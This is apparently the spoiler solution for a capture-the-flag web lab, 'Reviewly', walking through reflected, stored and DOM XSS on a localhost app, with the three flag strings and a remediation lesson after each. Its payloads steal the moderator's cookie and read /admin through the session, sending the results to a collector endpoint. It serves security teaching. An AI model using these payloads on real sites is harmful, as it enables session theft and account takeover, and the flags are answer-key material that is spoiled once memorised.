# 🚩 Reviewly — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

## Flag 1 — Reflected XSS, attribute breakout (`FLAG{r3fl3ct3d_4ttr_br34k0ut}`)

`/search?q=` reflects `q` **inside** a double-quoted attribute:

```html
<input name="q" value="<q HERE>" placeholder="e.g. battery">
```

A bare `<script>` sits *inside* the `value="..."` string and never becomes markup.
You must **close the attribute and the tag first**, then add your own element. Two
common shapes:

Break out with a new element that fires on error:

```html
"><img src=x onerror="new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`">
```

or break out and inject a fresh `<script>`:

```html
"><script>new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`</script>
```

The leading `">` closes `value="` and the `<input>` tag; everything after is your own
HTML. As with Postboard, the mod's `moderator_token` cookie is **not** httpOnly, so
`document.cookie` reads it. Backticks avoid the `+`-in-query-string trap.

**Deliver it:** report the crafted path at `/report`:

```
/search?q="><img src=x onerror="new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`">
```

curl:

```bash
curl -s -X POST http://localhost:8088/report \
  --data-urlencode 'url=/search?q="><img src=x onerror="new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`">'
sleep 6
curl -s http://localhost:8088/collector | grep -o 'FLAG{[^}]*}'
```

→ `moderator_token=FLAG{r3fl3ct3d_4ttr_br34k0ut}` on `/collector`.

**Lesson:** context decides the payload. The same reflection is harmless *between* tags
but exploitable *inside an attribute* if unencoded — and the fix is the same:
context-aware output encoding (auto-escape turns `"` into `&quot;`, killing the breakout).

## Flag 2 — Stored XSS, ride the session (`FLAG{st0r3d_r3v13w_x55_r1d3s}`)

`/reviews` renders each review's name + body unescaped, and the mod auto-reviews. The
`sid` session cookie is httpOnly (no theft) — so ride it with `fetch`:

```html
<script>fetch('/admin').then(r=>r.text()).then(t=>{new Image().src=`/collect?c=${encodeURIComponent(t)}`})</script>
```

Post it as a review body:

```bash
curl -s -X POST http://localhost:8088/reviews \
  --data-urlencode "author=totally_normal" \
  --data-urlencode 'message-not-used=' \
  --data-urlencode 'body=<script>fetch("/admin").then(r=>r.text()).then(t=>{new Image().src=`/collect?c=${encodeURIComponent(t)}`})</script>'
sleep 6
curl -s http://localhost:8088/collector | grep -o 'FLAG{[^}]*}'
```

The exfiltrated `/admin` HTML contains `FLAG{st0r3d_r3v13w_x55_r1d3s}`.

**Lesson:** `HttpOnly` stops cookie *theft*, not session *use*. Same-origin `fetch`
sends the cookie for you, so a script in the victim's origin acts as them. Fix: encode
the stored fields (kills the injection), add a CSP, least-privilege on `/admin`.

## Flag 3 — DOM XSS, document.write (`FLAG{d0m_x55_d0cum3nt_wr1t3}`)

`/share` runs, client-side:

```js
var ref = new URLSearchParams(location.hash.slice(1)).get('ref') || 'a friend';
document.write('<p>Referred by: ' + ref + '</p>');
```

The `#hash` never reaches the server. Unlike `innerHTML`, **`document.write` executes a
`<script>`**, so you can inject one directly:

```
http://localhost:8088/share#ref=<script>alert(reveal())</script>
```

`reveal()` is defined on the page (XOR-obfuscated flag). The alert prints:

```
FLAG{d0m_x55_d0cum3nt_wr1t3}
```

(Prefer no alert? `#ref=<script>document.title=reveal()</script>` and read the tab.)

**Lesson:** DOM XSS is a client-side bug — server escaping can't help. Fix at the sink:
never `document.write`/`innerHTML` untrusted input; build DOM with `textContent`, or
sanitise (DOMPurify). Treat `location.hash`/`search` as attacker-controlled.

---

### Full flag list
1. `FLAG{r3fl3ct3d_4ttr_br34k0ut}`  — reflected XSS, break out of an HTML attribute
2. `FLAG{st0r3d_r3v13w_x55_r1d3s}`  — stored XSS in comments, ride the httpOnly session
3. `FLAG{d0m_x55_d0cum3nt_wr1t3}`   — DOM XSS via document.write

### The one fix that kills all three
Context-aware output encoding at every sink (server auto-escape; client `textContent`,
never `document.write`/`innerHTML` of untrusted data), plus defence in depth: `HttpOnly`
+ `Secure` cookies and a restrictive `Content-Security-Policy`.
